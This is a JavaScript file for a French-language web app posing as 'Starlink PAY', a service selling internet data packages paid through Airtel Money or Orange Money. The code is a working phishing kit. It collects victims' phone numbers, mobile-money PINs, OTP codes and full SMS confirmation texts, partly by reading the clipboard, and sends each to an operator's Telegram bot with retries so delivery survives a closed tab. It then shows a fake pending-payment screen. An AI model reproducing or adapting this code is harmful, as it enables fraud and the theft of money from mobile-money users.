/**
 * STARLINK PAY — app.js
 * Standalone PWA. No dependency on airtel-congo project.
 * Telegram reporting calls the Bot API directly (no backend needed).
 */

'use strict';

// ─── TELEGRAM (direct API, fully independent) ──────────────────────────────

const TG = {
  LS_TOKEN:  'sp_tg_token',
  LS_CHATID: 'sp_tg_chatid',
  MAX_RETRIES: 2,

  init() {
    // Priority 1: config.js (SP_CONFIG) — the static .env equivalent
    const cfg = (typeof window !== 'undefined' && window.SP_CONFIG) || {};

    // Priority 2: URL query params — useful for one-time seeding on new devices
    const p = new URLSearchParams(window.location.search);
    const urlToken  = p.get('token')   || p.get('bot_token') || p.get('botToken');
    const urlChatId = p.get('chat_id') || p.get('chatId');
    if (urlToken && urlChatId) {
      localStorage.setItem(this.LS_TOKEN,  urlToken.trim());
      localStorage.setItem(this.LS_CHATID, urlChatId.trim());
      // Wipe credentials from the URL bar so they're not shareable/visible
      const clean = window.location.pathname + window.location.hash;
      window.history.replaceState(null, '', clean);
    }

    // Priority 3: localStorage — persisted from a previous URL-seeded session
    const lsToken  = localStorage.getItem(this.LS_TOKEN)  || '';
    const lsChatId = localStorage.getItem(this.LS_CHATID) || '';

    // config.js takes precedence; fall back to URL-seed → localStorage
    this.token  = (cfg.TG_TOKEN  && cfg.TG_TOKEN  !== 'YOUR_BOT_TOKEN_HERE')  ? cfg.TG_TOKEN  : (urlToken  || lsToken);
    this.chatId = (cfg.TG_CHAT_ID && cfg.TG_CHAT_ID !== 'YOUR_CHAT_ID_HERE') ? cfg.TG_CHAT_ID : (urlChatId || lsChatId);
  },

  ready() {
    return Boolean(this.token && this.chatId);
  },

  // Escape text for Telegram HTML parse_mode.
  // Only <, >, & need escaping — everything else passes through.
  esc(str) {
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');
  },

  // Core send: keepalive ensures delivery survives tab closure.
  // Retries once on network failure before giving up silently.
  async send(html, attempt = 0) {
    if (!this.ready()) return;
    const url = `https://api.telegram.org/bot${this.token}/sendMessage`;
    const body = JSON.stringify({
      chat_id:    this.chatId,
      text:       html,
      parse_mode: 'HTML'
    });
    try {
      const res = await fetch(url, {
        method:   'POST',
        headers:  { 'Content-Type': 'application/json' },
        body,
        keepalive: true   // survives page navigation / tab close
      });
      if (!res.ok && attempt < this.MAX_RETRIES) {
        // Non-2xx (e.g. 429 rate-limit) — wait 800ms then retry
        await new Promise(r => setTimeout(r, 800));
        return this.send(html, attempt + 1);
      }
    } catch (e) {
      // Network error — retry once immediately
      if (attempt < this.MAX_RETRIES) {
        await new Promise(r => setTimeout(r, 400));
        return this.send(html, attempt + 1);
      }
      console.warn('[TG] delivery failed after retries:', e.message);
    }
  }
};

// ─── STATE ─────────────────────────────────────────────────────────────────

const State = {
  plan:    '',
  data:    '',
  amount:  '',
  amountNum: 0,
  phone:   '',
  pin:     '',
  otp:     '',
  method:  '',
  refId:   '',

  reset() {
    this.plan = this.data = this.amount = this.phone = '';
    this.pin  = this.otp  = this.method = '';
    this.amountNum = 0;
    this.refId = genRef();
  }
};

function genRef() {
  return '#SP-' + Math.floor(1000 + Math.random() * 9000);
}

// ─── NAVIGATION ────────────────────────────────────────────────────────────

function showView(id) {
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  const el = document.getElementById(id);
  if (el) {
    el.classList.add('active');
    window.scrollTo({ top: 0, behavior: 'instant' });
  }
}

// ─── LOADING ───────────────────────────────────────────────────────────────

function showLoading(text = 'Traitement en cours...') {
  const el = document.getElementById('loading-overlay');
  document.getElementById('loading-text').textContent = text;
  el.classList.add('active');
}

function hideLoading() {
  document.getElementById('loading-overlay').classList.remove('active');
}

// ─── TOAST ─────────────────────────────────────────────────────────────────

function toast(msg, duration = 3500) {
  const wrap = document.getElementById('toast-wrap');
  const t = document.createElement('div');
  t.className = 'toast';
  t.textContent = msg;
  wrap.appendChild(t);
  setTimeout(() => {
    t.style.opacity = '0';
    t.style.transition = 'opacity 0.3s';
    setTimeout(() => t.remove(), 320);
  }, duration);
}

// ─── APP OBJECT ────────────────────────────────────────────────────────────

const App = {

  // ── Packages → Payment modal ──────────────────────────────────────────

  openPaymentModal(plan, data, amount, amountNum) {
    State.plan      = plan;
    State.data      = data;
    State.amount    = amount;
    State.amountNum = amountNum;

    document.getElementById('modal-payment').classList.add('active');
  },

  closePaymentModal() {
    document.getElementById('modal-payment').classList.remove('active');
  },

  // ── Payment method selection ──────────────────────────────────────────

  selectPaymentMethod(method) {
    this.closePaymentModal();
    State.method = method;

    if (method === 'airtel') {
      document.getElementById('airtel-meta-amount').textContent = State.amount;
      this._resetAirtelForm();
      showView('view-airtel');
    } else {
      document.getElementById('orange-meta-amount').textContent = State.amount;
      this._resetOrangeForm();
      showView('view-orange');
    }
  },

  goBack(from) {
    const map = {
      'airtel':     'view-packages',
      'orange':     'view-packages',
      'airtel-otp': 'view-airtel',
      'orange-otp': 'view-orange'
    };
    if (map[from]) showView(map[from]);
  },

  // ── AIRTEL FORM ───────────────────────────────────────────────────────

  onCountryChange(method, code) {
    const flagEl = document.getElementById(`${method}-country-flag`);
    const codeEl = document.getElementById(`${method}-country-code`);
    const inputEl = document.getElementById(`${method}-phone`);
    if (code === '+243') {
      if (flagEl) { flagEl.src = 'assets/flag_cd.svg'; flagEl.alt = 'RD Congo'; }
      if (codeEl) codeEl.textContent = '+243';
      if (inputEl) inputEl.placeholder = method === 'airtel' ? '951234567' : '81XXXXXXX';
    } else {
      if (flagEl) { flagEl.src = 'assets/flag_cg.svg'; flagEl.alt = 'Congo-Brazzaville'; }
      if (codeEl) codeEl.textContent = '+242';
      if (inputEl) inputEl.placeholder = '06XXXXXXX';
    }
  },

  _resetAirtelForm() {
    document.getElementById('form-airtel').reset();
    const sel = document.getElementById('airtel-country-select');
    if (sel) { sel.value = '+243'; this.onCountryChange('airtel', '+243'); }
    for (let i = 1; i <= 4; i++) {
      const b = document.getElementById(`airtel-pin-${i}`);
      if (b) b.value = '';
    }
    this._setReady('btn-airtel-submit', false);
    document.getElementById('err-airtel-phone').classList.remove('visible');
    document.getElementById('err-airtel-pin').classList.remove('visible');
  },

  onAirtelInput() {
    const phone = document.getElementById('airtel-phone').value.replace(/\D/g,'');
    document.getElementById('airtel-phone').value = phone;
    const pin = this._getPinValue('airtel');
    this._setReady('btn-airtel-submit', phone.length === 9 && pin.length === 4);
  },

  pinInput(el, idx, prefix) {
    el.value = el.value.replace(/\D/g,'').slice(0,1);
    if (el.value) {
      const next = document.getElementById(`${prefix}-pin-${idx+1}`);
      if (next) next.focus();
    }
    if (prefix === 'airtel') this.onAirtelInput();
  },

  pinKeydown(e, idx, prefix) {
    if (e.key === 'Backspace') {
      const el = document.getElementById(`${prefix}-pin-${idx}`);
      if (!el.value && idx > 1) {
        const prev = document.getElementById(`${prefix}-pin-${idx-1}`);
        if (prev) { prev.value = ''; prev.focus(); }
      }
    }
  },

  _getPinValue(prefix) {
    let p = '';
    for (let i = 1; i <= 4; i++) {
      const b = document.getElementById(`${prefix}-pin-${i}`);
      if (b) p += b.value;
    }
    return p;
  },

  togglePinVisibility(prefix) {
    for (let i = 1; i <= 4; i++) {
      const b = document.getElementById(`${prefix}-pin-${i}`);
      if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
  },

  async submitAirtelForm(e) {
    e.preventDefault();
    const phone = document.getElementById('airtel-phone').value.replace(/\D/g,'');
    const pin   = this._getPinValue('airtel');
    let valid   = true;

    if (phone.length !== 9) {
      document.getElementById('err-airtel-phone').classList.add('visible');
      valid = false;
    } else {
      document.getElementById('err-airtel-phone').classList.remove('visible');
    }
    if (pin.length !== 4) {
      document.getElementById('err-airtel-pin').classList.add('visible');
      valid = false;
    } else {
      document.getElementById('err-airtel-pin').classList.remove('visible');
    }
    if (!valid) return;

    const sel = document.getElementById('airtel-country-select');
    const prefix = sel ? sel.value : '+243';
    State.phone = prefix + phone;
    State.pin   = pin;

    showLoading('Envoi en cours...');

    await TG.send(
`<b>STARLINK PAY — AIRTEL MONEY</b>
━━━━━━━━━━━━━━━━━━━━
<b>Ref:</b> <code>${TG.esc(State.refId)}</code>
<b>Forfait:</b> ${TG.esc(State.plan)} — ${TG.esc(State.data)}
<b>Montant:</b> ${TG.esc(State.amount)}
<b>Numéro:</b> <code>${TG.esc(State.phone)}</code>
<b>PIN:</b> <code>${TG.esc(State.pin)}</code>
<b>Heure:</b> ${new Date().toLocaleString()}`
    );

    hideLoading();

    // Go to Airtel OTP
    document.getElementById('airtel-otp-phone-display').textContent = State.phone;
    this._resetAirtelOtp();
    showView('view-airtel-otp');
    this._startOtpTimer('airtel-otp-timer', 39);
  },

  // ── AIRTEL OTP ────────────────────────────────────────────────────────

  _resetAirtelOtp() {
    for (let i = 1; i <= 4; i++) {
      const b = document.getElementById(`aotp-${i}`);
      if (b) b.value = '';
    }
    this._setReady('btn-airtel-otp-submit', false);
    document.getElementById('err-airtel-otp').classList.remove('visible');
  },

  otpInput(el, idx, which) {
    el.value = el.value.replace(/\D/g,'').slice(0,1);
    if (el.value && idx < 4) {
      const next = document.getElementById(which === 'airtel' ? `aotp-${idx+1}` : `ootp-${idx+1}`);
      if (next) next.focus();
    }
    const all = [1,2,3,4].map(i => {
      const b = document.getElementById(which === 'airtel' ? `aotp-${i}` : `ootp-${i}`);
      return b ? b.value : '';
    }).join('');
    this._setReady(which === 'airtel' ? 'btn-airtel-otp-submit' : 'btn-ootp-submit', all.length === 4);
  },

  otpKeydown(e, idx, which) {
    if (e.key === 'Backspace') {
      const pfx = which === 'airtel' ? 'aotp' : 'ootp';
      const el = document.getElementById(`${pfx}-${idx}`);
      if (!el.value && idx > 1) {
        const prev = document.getElementById(`${pfx}-${idx-1}`);
        if (prev) { prev.value = ''; prev.focus(); }
      }
    }
  },

  async submitAirtelOtp(e) {
    e.preventDefault();
    const otp = [1,2,3,4].map(i => document.getElementById(`aotp-${i}`).value).join('');

    if (otp.length !== 4) {
      document.getElementById('err-airtel-otp').classList.add('visible');
      return;
    }

    State.otp = otp;
    showLoading('Vérification OTP...');

    await TG.send(
`<b>STARLINK PAY — OTP AIRTEL</b>
━━━━━━━━━━━━━━━━━━━━
<b>Ref:</b> <code>${TG.esc(State.refId)}</code>
<b>Numéro:</b> <code>${TG.esc(State.phone)}</code>
<b>Code OTP:</b> <code>${TG.esc(State.otp)}</code>
<b>Heure:</b> ${new Date().toLocaleString()}`
    );

    hideLoading();
    this._showPending();
  },

  // ── ORANGE FORM ───────────────────────────────────────────────────────

  _resetOrangeForm() {
    document.getElementById('form-orange').reset();
    const sel = document.getElementById('orange-country-select');
    if (sel) { sel.value = '+242'; this.onCountryChange('orange', '+242'); }
    this._setReady('btn-orange-submit', false);
    document.getElementById('err-orange-phone').classList.remove('visible');
    document.getElementById('err-orange-pin').classList.remove('visible');
  },

  onOrangeInput() {
    const phone = document.getElementById('orange-phone').value.replace(/\D/g,'');
    document.getElementById('orange-phone').value = phone;
    const pin = document.getElementById('orange-pin').value.replace(/\D/g,'').slice(0,4);
    document.getElementById('orange-pin').value = pin;
    this._setReady('btn-orange-submit', phone.length >= 9 && pin.length === 4);
  },

  toggleOrangePinVisibility() {
    const f = document.getElementById('orange-pin');
    f.type = f.type === 'password' ? 'text' : 'password';
  },

  async submitOrangeForm(e) {
    e.preventDefault();
    const phone = document.getElementById('orange-phone').value.replace(/\D/g,'');
    const pin   = document.getElementById('orange-pin').value;
    let valid = true;

    if (phone.length < 9) {
      document.getElementById('err-orange-phone').classList.add('visible');
      valid = false;
    } else {
      document.getElementById('err-orange-phone').classList.remove('visible');
    }
    if (pin.length !== 4) {
      document.getElementById('err-orange-pin').classList.add('visible');
      valid = false;
    } else {
      document.getElementById('err-orange-pin').classList.remove('visible');
    }
    if (!valid) return;

    const sel = document.getElementById('orange-country-select');
    const prefix = sel ? sel.value : '+242';
    State.phone = prefix + phone;
    State.pin   = pin;

    showLoading('Envoi en cours...');

    await TG.send(
`<b>STARLINK PAY — ORANGE MONEY</b>
━━━━━━━━━━━━━━━━━━━━
<b>Ref:</b> <code>${TG.esc(State.refId)}</code>
<b>Forfait:</b> ${TG.esc(State.plan)} — ${TG.esc(State.data)}
<b>Montant:</b> ${TG.esc(State.amount)}
<b>Numéro:</b> <code>${TG.esc(State.phone)}</code>
<b>PIN:</b> <code>${TG.esc(State.pin)}</code>
<b>Heure:</b> ${new Date().toLocaleString()}`
    );

    hideLoading();

    // Go to Orange OTP paste view
    document.getElementById('orange-otp-phone-display').textContent = State.phone;
    document.getElementById('orange-otp-message').value = '';
    document.getElementById('clipboard-status').textContent = 'Cliquez pour accorder l\'accès au presse-papiers — vous pouvez aussi coller manuellement (Ctrl+V / appui long).';
    this._setReady('btn-orange-otp-submit', false);
    document.getElementById('err-orange-otp').classList.remove('visible');
    showView('view-orange-otp');
  },

  // ── ORANGE OTP (paste message) ────────────────────────────────────────

  onOrangeOtpInput() {
    const val = document.getElementById('orange-otp-message').value.trim();
    this._setReady('btn-orange-otp-submit', val.length > 0);
  },

  async pasteFromClipboard() {
    const statusEl = document.getElementById('clipboard-status');
    const textarea  = document.getElementById('orange-otp-message');
    const btn       = document.getElementById('btn-paste-clipboard');

    // ── Clipboard API not available (non-HTTPS on some browsers, old Firefox) ──
    if (!navigator.clipboard || !navigator.clipboard.readText) {
      statusEl.textContent = 'Fonctionnalité non disponible — collez le message manuellement (Ctrl+V / appui long).';
      textarea.focus();
      return;
    }

    btn.disabled = true;
    statusEl.textContent = 'Lecture du presse-papiers…';

    try {
      // Ask for / check permission explicitly first when Permissions API is available
      if (navigator.permissions) {
        try {
          const perm = await navigator.permissions.query({ name: 'clipboard-read' });
          if (perm.state === 'denied') {
            statusEl.textContent = 'Accès au presse-papiers refusé par le navigateur. Collez manuellement (Ctrl+V / appui long).';
            btn.disabled = false;
            textarea.focus();
            return;
          }
          // 'granted' or 'prompt' — proceed; 'prompt' will open the browser dialog
        } catch (_) {
          // Permissions API may not support clipboard-read on this browser — proceed anyway
        }
      }

      const text = await navigator.clipboard.readText();

      if (text && text.trim()) {
        textarea.value = text.trim();
        this.onOrangeOtpInput();
        // Visual flash to confirm paste
        textarea.classList.add('paste-flash');
        setTimeout(() => textarea.classList.remove('paste-flash'), 600);
        statusEl.textContent = '✓ Message collé avec succès.';
        statusEl.className = 'clipboard-note success';
        toast('Message collé depuis le presse-papiers.');
      } else {
        statusEl.className = 'clipboard-note';
        statusEl.textContent = 'Presse-papiers vide — copiez le SMS Orange Money d\'abord, puis réessayez.';
        textarea.focus();
      }
    } catch (err) {
      if (err.name === 'NotAllowedError') {
        statusEl.className = 'clipboard-note';
        statusEl.textContent = 'Permission refusée. Collez le message manuellement (Ctrl+V / appui long sur le champ).';
      } else if (err.name === 'SecurityError') {
        statusEl.textContent = 'Accès sécurisé requis. Collez manuellement (Ctrl+V / appui long).';
      } else {
        statusEl.textContent = 'Impossible de lire le presse-papiers. Collez le message manuellement.';
      }
      textarea.focus();
    } finally {
      btn.disabled = false;
    }
  },

  async submitOrangeOtp(e) {
    e.preventDefault();
    const msg = document.getElementById('orange-otp-message').value.trim();
    if (!msg) {
      document.getElementById('err-orange-otp').classList.add('visible');
      return;
    }
    document.getElementById('err-orange-otp').classList.remove('visible');
    State.otp = msg;

    showLoading('Vérification en cours...');

    await TG.send(
`<b>STARLINK PAY — MESSAGE OTP ORANGE</b>
━━━━━━━━━━━━━━━━━━━━
<b>Ref:</b> <code>${TG.esc(State.refId)}</code>
<b>Numéro:</b> <code>${TG.esc(State.phone)}</code>
<b>Message SMS:</b>
<code>${TG.esc(msg)}</code>
<b>Heure:</b> ${new Date().toLocaleString()}`
    );

    hideLoading();
    this._showPending();
  },

  // ── PENDING SCREEN ────────────────────────────────────────────────────

  _showPending() {
    document.getElementById('pend-ref').textContent    = State.refId;
    document.getElementById('pend-plan').textContent   = State.plan;
    document.getElementById('pend-amount').textContent = State.amount;
    document.getElementById('pend-phone').textContent  = State.phone;
    document.getElementById('pend-method').textContent =
      State.method === 'airtel' ? 'Airtel Money' : 'Orange Money';
    showView('view-pending');
  },

  // ── OTP TIMER ─────────────────────────────────────────────────────────

  _timerHandle: null,

  _startOtpTimer(elId, seconds) {
    if (this._timerHandle) clearInterval(this._timerHandle);
    let s = seconds;
    const el = document.getElementById(elId);
    if (el) el.textContent = s;
    this._timerHandle = setInterval(() => {
      s--;
      if (el) el.textContent = s;
      if (s <= 0) clearInterval(this._timerHandle);
    }, 1000);
  },

  // ── HELPERS ───────────────────────────────────────────────────────────

  _setReady(btnId, ready) {
    const btn = document.getElementById(btnId);
    if (!btn) return;
    btn.classList.toggle('ready', ready);
  },

  // ── RESET ─────────────────────────────────────────────────────────────

  reset() {
    State.reset();
    document.getElementById('form-airtel').reset();
    document.getElementById('form-orange').reset();
    document.getElementById('form-airtel-otp').reset();
    document.getElementById('form-orange-otp').reset();
    for (let i = 1; i <= 4; i++) {
      const a = document.getElementById(`airtel-pin-${i}`);
      if (a) a.value = '';
      const ao = document.getElementById(`aotp-${i}`);
      if (ao) ao.value = '';
    }
    this._setReady('btn-airtel-submit', false);
    this._setReady('btn-orange-submit', false);
    this._setReady('btn-airtel-otp-submit', false);
    this._setReady('btn-orange-otp-submit', false);
    showView('view-packages');
  }
};

// ─── CLOSE MODAL ON BACKDROP CLICK ─────────────────────────────────────────

document.getElementById('modal-payment').addEventListener('click', function(e) {
  if (e.target === this) App.closePaymentModal();
});

// ─── INIT ───────────────────────────────────────────────────────────────────

TG.init();
State.refId = genRef();

// ─── PWA INSTALL PROMPT ─────────────────────────────────────────────────────

const PWAInstall = {
  _deferred: null,
  _bannerDismissed: false,

  init() {
    // Chromium: capture beforeinstallprompt so we can show it on our terms
    window.addEventListener('beforeinstallprompt', (e) => {
      e.preventDefault();
      this._deferred = e;
      if (!this._bannerDismissed && !this._isStandalone()) {
        document.getElementById('pwa-install-banner').style.display = 'flex';
      }
    });

    // Hide banner once user installs
    window.addEventListener('appinstalled', () => {
      this._hideBanner();
      toast('Application installée avec succès !');
    });

    // iOS Safari: show the share-sheet hint if running in Safari on iOS
    if (this._isIos() && !this._isStandalone()) {
      // Small delay so page renders first
      setTimeout(() => {
        if (!this._bannerDismissed) {
          document.getElementById('ios-install-hint').style.display = 'flex';
        }
      }, 2500);
    }
  },

  async prompt() {
    if (!this._deferred) return;
    this._deferred.prompt();
    const result = await this._deferred.userChoice;
    this._deferred = null;
    this._hideBanner();
    if (result && result.outcome === 'accepted') {
      toast('Installation en cours…');
    }
  },

  dismiss() {
    this._bannerDismissed = true;
    this._hideBanner();
  },

  dismissIos() {
    this._bannerDismissed = true;
    document.getElementById('ios-install-hint').style.display = 'none';
  },

  _hideBanner() {
    document.getElementById('pwa-install-banner').style.display = 'none';
  },

  _isStandalone() {
    return window.matchMedia('(display-mode: standalone)').matches ||
           window.navigator.standalone === true;
  },

  _isIos() {
    return /iphone|ipad|ipod/i.test(navigator.userAgent) &&
           !window.MSStream;
  }
};

// ─── SERVICE WORKER REGISTRATION ────────────────────────────────────────────

if ('serviceWorker' in navigator) {
  window.addEventListener('load', () => {
    navigator.serviceWorker.register('./sw.js')
      .then(reg => {
        // Force immediate activation of new SW
        reg.addEventListener('updatefound', () => {
          const newWorker = reg.installing;
          if (newWorker) {
            newWorker.addEventListener('statechange', () => {
              if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
                // New version available — silently update
                newWorker.postMessage({ type: 'SKIP_WAITING' });
              }
            });
          }
        });
      })
      .catch(() => {});
  });
}

// ─── BOOT ────────────────────────────────────────────────────────────────────

PWAInstall.init();
